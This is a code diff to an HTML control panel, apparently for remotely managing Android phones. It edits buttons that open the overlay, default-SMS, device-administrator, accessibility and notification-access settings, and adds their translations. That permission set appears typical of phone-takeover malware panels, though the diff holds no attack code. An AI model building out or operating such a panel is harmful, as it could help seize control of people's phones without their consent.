@@ -2143,12 +2143,12 @@
                     <div id="permStatusBox" style="display:none;background:var(--bg-dark);border:1px solid var(--border-color);border-radius:4px;padding:8px;margin-bottom:8px;font-size:0.7rem;max-height:120px;overflow:auto;"></div>
                     <div class="section-title"><i data-feather="settings"></i> <span data-i18n="perm_settings_section">Настройки</span></div>
                     <div class="action-grid">
-                        <button class="action-btn" onclick="openSettingsPage('open_notification_listener')"><i data-feather="bell"></i><span data-i18n="perm_notifications">Уведомления</span></button>
-                        <button class="action-btn" onclick="openSettingsPage('open_overlay')"><i data-feather="layers"></i>Overlay</button>
+                        <button class="action-btn" onclick="openSettingsPage('open_notification_access')"><i data-feather="bell"></i><span data-i18n="perm_notifications">Уведомления</span></button>
+                        <button class="action-btn" onclick="openSettingsPage('open_overlay_perm')"><i data-feather="layers"></i>Overlay</button>
                         <button class="action-btn" onclick="openSettingsPage('open_default_sms')"><i data-feather="message-square"></i><span data-i18n="perm_default_sms">SMS по ум.</span></button>
-                        <button class="action-btn" onclick="openSettingsPage('open_battery')"><i data-feather="battery-charging"></i><span data-i18n="perm_battery">Батарея</span></button>
+                        <button class="action-btn" onclick="openSettingsPage('open_battery_opt')"><i data-feather="battery-charging"></i><span data-i18n="perm_battery">Батарея</span></button>
                         <button class="action-btn" onclick="openSettingsPage('open_usage_stats')"><i data-feather="bar-chart"></i>Usage Stats</button>
-                        <button class="action-btn" onclick="openSettingsPage('open_install_unknown')"><i data-feather="download"></i><span data-i18n="perm_unknown_sources">Неизв. источники</span></button>
+                        <button class="action-btn" onclick="openSettingsPage('open_device_admin')"><i data-feather="shield"></i><span data-i18n="perm_device_admin">Администратор</span></button>
                         <button class="action-btn" onclick="openSettingsPage('open_accessibility')"><i data-feather="eye"></i>Accessibility</button>
                     </div>
                 </div>
@@ -2421,6 +2421,7 @@
                 perm_notifications: 'Уведомления',
                 perm_default_sms: 'SMS по ум.',
                 perm_battery: 'Батарея',
+                perm_device_admin: 'Администратор',
                 perm_unknown_sources: 'Неизв. источники',
                 win_files_title: 'Файлы',
                 fm_up: 'Вверх',
@@ -2837,6 +2838,7 @@
                 perm_notifications: 'Notifications',
                 perm_default_sms: 'Default SMS',
                 perm_battery: 'Battery',
+                perm_device_admin: 'Device Admin',
                 perm_unknown_sources: 'Unknown sources',
                 win_files_title: 'Files',
                 fm_up: 'Up',
